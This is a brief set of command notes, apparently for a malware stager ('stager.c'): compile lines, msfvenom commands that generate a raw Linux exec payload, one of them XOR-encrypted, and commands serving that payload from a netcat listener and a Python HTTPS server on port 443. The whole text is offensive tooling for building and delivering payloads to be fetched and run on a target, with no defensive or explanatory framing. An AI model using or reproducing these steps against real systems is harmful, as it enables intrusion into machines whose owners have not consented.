
//32 bits
gcc stager.c -m32 -lssl


//64 bits
gcc stager.c -lssl


//create payload
msfvenom -p linux/x86/exec cmd="whoami" exitfunc=none/thread -f raw -o shell
msfvenom -p linux/x86/exec cmd="whoami" exitfunc=none/thread --encrypt=xor --encrypt=YoloSpaceHacker -f raw -o shell


//serve payload
nc -lvnp 9000 < shell

sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);context.load_cert_chain('localhost.pem', 'localhost.key');httpd.socket=context.wrap_socket(httpd.socket,server_side=True);httpd.serve_forever()"

